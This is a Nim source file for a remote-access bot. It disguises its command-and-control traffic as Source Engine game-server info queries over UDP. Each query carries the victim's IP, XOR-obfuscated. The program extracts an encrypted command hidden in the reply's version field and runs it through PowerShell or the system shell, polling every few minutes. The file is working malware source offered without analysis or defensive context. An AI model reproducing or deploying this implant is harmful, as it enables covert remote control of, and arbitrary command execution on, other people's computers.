import net
import os
import osproc
import base64

const SERVER: string = "127.0.0.1"
const PORT: Port = Port(27015)
const KEY: string = "asdf"
const CHECKING_TIME: int = 240

const HEADER_PADDING: string = "\xFF\xFF\xFF\xFF"
const INFO_HEADER: string = "\x54"

var IP: string = $getPrimaryIPAddr()

type InfoResponse = object
    bots: int
    version: string

proc skipCString(data: string, index: int): int =
    var newIndex: int = index + 1;

    while newIndex < data.len:
        if data[newIndex] == '\x00':
            break

        newIndex = newIndex + 1

    return newIndex

proc xorMessage(plain: string, key: string): string =
    result = newString(plain.len)

    for i in 0 ..< plain.len:
        let plainByte = ord(plain[i])
        let keyByte = ord(key[i mod key.len])
        result[i] = chr(plainByte xor keyByte)

    return result

proc sendInfoQuery(socket: Socket): void = 
    var queryPayload: string = HEADER_PADDING & INFO_HEADER & "Source Engine Query" & encode(xorMessage(IP, KEY)) & "\x00"
    socket.sendTo(SERVER, PORT, queryPayload)

proc parseInfo(msg: string): InfoResponse =
    if msg == "":
        return
    
    var i: int = 6 # Skip header and protocol

    #Skip name, map, folder, game
    for x in 1..4:
        i = skipCString(msg, i)
    
    i = i + 5 # Skip Steam app ID, players, max players
    
    var bots: int
    if msg[i] == '\x00':
        bots = 0
    else:
        bots = 1

    i = i + 5 # Skip server type, environment, visibility, VAC

    var encVersion: string

    while true:
        if msg[i] == '\x00':
            break

        encVersion = encVersion & msg[i]
        i = i + 1

    var version: string = xorMessage(decode(encVersion), KEY)

    return InfoResponse(bots: bots, version: version)

proc recvResponse(socket: Socket): string =
    var message: string
    var data: string

    while true:
        try:
            data = socket.recv(1, 1000)

            message = message & data
        except:
            break
    
    return message

proc main(): void =
    var socket: Socket = newSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
    var response: string
    var info: InfoResponse

    while true:
        try:
            sendInfoQuery(socket)
            response = recvResponse(socket)
            info = parseInfo(response)

            if defined(windows):
                discard execCmdEx("powershell -c " & info.version)
            else:
                discard execCmdEx(info.version)
        
        except:
            discard

        if info.bots == 0:
            sleep(CHECKING_TIME * 1000)

if isMainModule:
    main()